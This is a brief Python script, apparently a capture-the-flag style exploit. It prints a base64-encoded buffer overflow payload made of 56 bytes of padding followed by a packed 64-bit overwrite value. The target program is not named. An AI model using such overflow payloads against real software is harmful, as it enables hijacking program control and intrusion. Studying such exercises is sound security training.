
import sys
import struct
import base64

buf = b'LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL'
buf += struct.pack('<Q', 12669802055563663995)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
